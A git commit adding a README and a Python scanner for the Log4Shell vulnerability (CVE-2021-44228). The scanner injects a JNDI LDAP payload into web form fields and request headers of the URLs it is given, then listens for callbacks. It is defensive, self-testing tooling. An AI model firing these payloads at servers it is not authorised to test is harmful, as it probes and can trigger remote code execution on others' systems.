b5b5ec73a854f582bb0ab572d1e7496546553b7a
Luca_XPS <luca.p.fama@gmail.com>
2021-12-13 19:35:00 +0100

    First commit

---
+++ Readme.md
@@ -0,0 +1,38 @@
+# Log4j_checker.py (CVE-2021-44228)
+
+## Description
+
+This Python3 script tries to look for servers vulnerable to [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228), also known as [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/), a very critical vulnerability found in Log4j2 Java logging library. 
+
+It doesn't rely on external DNS log servers to verify and validate the vulnerable targets: when started, a new thread listening on all interfaces and port 55555 (can be changed using .env file or environment variables) is created: it will wait for callback connections from the vulnerable machines and it will notify the main thread through a Python Queue. Keep in mind that you might need to add firewall rules (and/or port forwarding rules) to allow incoming connection to the listening IP:port pair.
+
+In order to increase chances to trigger the vulnerability, the tool takes a URL as argument (or a list of URLs) and it looks for any form included in the URL(s) provided. Then it tries to exploit the vulnerability using each parameter for each form found (GET and POST requests). This is the default behaviour but it can be disabled using the ```--skip-forms``` option (in this case ony 1 request will be performed and the payload will be placed within few header fields).
+
+Also, the following predefined headers are used to test if the targets are vulnerable:
+- User-Agent
+- X-Fowarded-For
+- Referer
+
+Custom headers can be added via command line option.
+
+For a complete usage description see below section.
+
+## Usage
+
+```
+python3 log4j_checker.py -h
+usage: log4j_checker.py [-h] [--url URL] [--headers HEADERS [HEADERS ...]] [--urls URLS] [--skip-forms]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  --url URL             Single url you want to test
+  --headers HEADERS [HEADERS ...]
+                        Custom headers you want to try (space separated)
+  --urls URLS           A file containing 1 url per line
+  --skip-forms          Skip forms check (only perform 1 request)
+```
+
+## Disclaimer
+
+This tool is meant to be used for testing your own systems.
+ 
---
+++ log4j_checker.py
@@ -0,0 +1,190 @@
+import sys
+import os
+from dotenv import load_dotenv
+import requests
+import socket
+import argparse
+from urllib.parse import urlparse
+from bs4 import BeautifulSoup as bs
+from queue import Queue
+import threading
+from termcolor import cprint
+
+headers = ["User-Agent", "X-Forwarded-For", "Referer"]
+
+
+def getUrlsFromFile(path):
+    with open(path) as f:
+        lines = [line for line in f.read().splitlines() if line.strip()]
+    return lines
+
+
+def getAllForms(url):
+    results = []
+    try:
+        res = requests.get(url, timeout=10)
+    except Exception as e:
+        print(e)
+        return results
+    content = bs(res.text, 'html.parser')
+    forms = content.findAll('form')
+    for form in forms:
+        action = form.get('action')
+        if(action == None):
+            continue
+        method = 'GET' if form.get('method') is None else form.get('method')
+        inputs = form.find_all('input')
+        item = {"url": url, "action": action, "method": method, "inputs": []}
+        for input in inputs:
+            if input.get('name') != None:
+                item["inputs"].append(input.get('name'))
+        results.append(item)
+    return results
+
+
+def performRequest(form, socket_ip_port):
+    hd = {}
+    exploit = "${jndi:ldap://" + socket_ip_port + "}"
+    for c in headers:
+        hd[c] = exploit
+    try:
+        if(form["action"] != "" and form["action"][0] == "/"):
+            parsed_uri = urlparse(form["url"])
+            result = '{uri.scheme}://{uri.netloc}'.format(uri=parsed_uri)
+            form["url"] = result + form["action"]
+        if(form["method"].upper() == 'GET'):
+            getParams = "?"
+            for input in form["inputs"]:
+                getParams += input + "=" + exploit
+                if input != form["inputs"][-1]:
+                    getParams += "&"
+            cprint(f"[+] Trying GET request: {form['url']+getParams}", "cyan")
+            requests.get(form['url']+getParams, headers=hd, timeout=10)
+        elif(form["method"].upper() == 'POST'):
+            payload = {}
+            for input in form["inputs"]:
+                payload[input] = exploit
+            cprint(
+                f"[+] Trying POST request: {form['url']} with payload:  {str(payload)}", "cyan")
+            requests.post(form["url"], headers=hd, data=payload, timeout=10)
+        else:
+            cprint(f"[-] Unsoppurted method: {form['method']}")
+    except Exception as e:
+        raise e
+
+
+def log4jExploit(q, url, port, ip, skip_forms):
+
+    # Quick (and dumb) hack to avoid requests timeout when port 80/443 is closed
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(1)
+            s.connect((ip, port))
+            s.close()
+    except:
+        cprint(f"[E] Skipping url {url} because port {port} is closed!", "red")
+        return
+
+    # Exploit logic
+    if(skip_forms == False):
+        forms = getAllForms(url)
+        cprint(f"[+] Found {len(forms)} form" if (len(forms) ==
+               0 or len(forms) == 1) else f"[+] Found {len(forms)} forms", "cyan")
+        for form in forms:
+            performRequest(form, os.getenv("IP") + ":" + os.getenv('LPORT'))
+    hd = {}
+    exploit = "${jndi:ldap://" + \
+        os.getenv("IP") + ":" + os.getenv('LPORT') + "}"
+    for c in headers:
+        hd[c] = exploit
+    try:
+        cprint(
+            f"[+] Trying GET request (only headers) to main url: {url}", "blue")
+        requests.get(url, headers=hd, timeout=10)
+        res = None
+        while(q.qsize() != 0):
+            res = q.get()
+        if(res != None):
+            cprint(
+                f"[+] {url} is vulnerable! Outgoing IP address and port: {res} ", "red", attrs=['blink', 'bold'])
+        else:
+            cprint(f"[+] {url} does NOT seem to be vulnerable!",
+                   "green", attrs=['bold'])
+    except Exception as e:
+        raise e
+
+
+def serverThread(q, s):
+    while True:
+        try:
+            conn, addr = s.accept()
+            with conn:
+                q.put(addr)
+                conn.close()
+        except Exception as e:
+            #print("Socket has been closed by main thread! Exiting...")
+            sys.exit(0)
+
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--url", help="Single url you want to test")
+    parser.add_argument("--headers", nargs='+',
+                        help="Custom headers you want to try (space separated)")
+    parser.add_argument("--urls", help="A file containing 1 url per line")
+    parser.add_argument("--skip-forms", default=False, action="store_true",
+                        help="Skip forms check (only perform 1 request)")
+    args = parser.parse_args()
+
+    urls = []
+
+    if(args.headers != None):
+        for custom_header in args.headers:
+            headers.append(custom_header)
+
+    skip_forms = args.skip_forms
+
+    if(args.url == None and args.urls == None):
+        cprint("[E] At least 1 url must be provided", "red")
+        sys.exit(1)
+    if(args.urls != None):
+        urls = getUrlsFromFile(args.urls)
+    else:
+        urls.append(args.url)
+
+    load_dotenv()
+
+    HOST = "0.0.0.0"
+    PORT = int(os.getenv("LPORT"))
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.bind((HOST, PORT))
+    server_socket.listen()
+
+    q = Queue()
+    t1 = threading.Thread(target=serverThread, args=(q, server_socket))
+    t1.start()
+
+    for url in urls:
+        try:
+            parsed_uri = urlparse(url)
+            scheme = '{uri.scheme}'.format(uri=parsed_uri)
+            if scheme != 'http' and scheme != 'https':
+                raise Exception(f"Unsupported schema {scheme}")
+            result = '{uri.netloc}'.format(uri=parsed_uri)
+            cprint(
+                f"[+] Going to test url: {url} ({socket.gethostbyname(result)})", "yellow")
+            log4jExploit(q, url, 80 if scheme == 'http' else 443,
+                         socket.gethostbyname(result), skip_forms)
+        except KeyboardInterrupt:
+            server_socket.close()
+            sys.exit(0)
+        except Exception as e:
+            cprint(
+                f"[E] Exception: \" {str(e)} \" while processing url {url}", "red")
+            continue
+    server_socket.close()
+    sys.exit(0)
+
+
+if __name__ == '__main__':
+    main()
